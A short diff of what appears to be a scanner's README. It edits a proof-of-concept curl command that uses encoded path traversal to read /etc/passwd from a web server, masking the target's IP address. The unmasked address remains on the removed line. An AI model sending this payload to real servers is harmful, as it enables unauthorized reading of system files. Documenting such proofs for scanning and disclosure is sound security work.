@@ -44,6 +44,6 @@ To scan targets in a file :
 
 POC : 
 
-```curl -s  -k  https://135.148.120.171:8443/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd ```
+```curl -s  -k  https://135.*.120.*:8443/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd ```
 
 ![POC](https://imgur.com/ijInybr.png)
